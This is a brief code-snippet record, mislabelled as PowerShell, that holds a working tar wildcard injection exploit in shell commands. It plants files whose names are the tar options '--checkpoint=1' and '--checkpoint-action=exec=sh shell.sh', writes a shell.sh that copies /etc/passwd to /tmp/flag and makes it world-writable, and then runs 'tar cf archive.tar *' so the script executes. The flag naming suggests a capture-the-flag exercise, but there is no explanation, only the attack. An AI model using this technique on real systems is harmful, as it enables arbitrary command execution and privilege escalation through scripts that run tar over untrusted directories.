---
id: 17b36ff2-cb44-44a4-88a3-856b43e87a5f
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:19.127348+00:00'
updated_at: '2023-04-10T20:34:29.985239+00:00'
---

# Code Snippet 17b36ff2

**Language**: Powershell

```powershell
# create file for exploitation
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script
tar cf archive.tar *
```


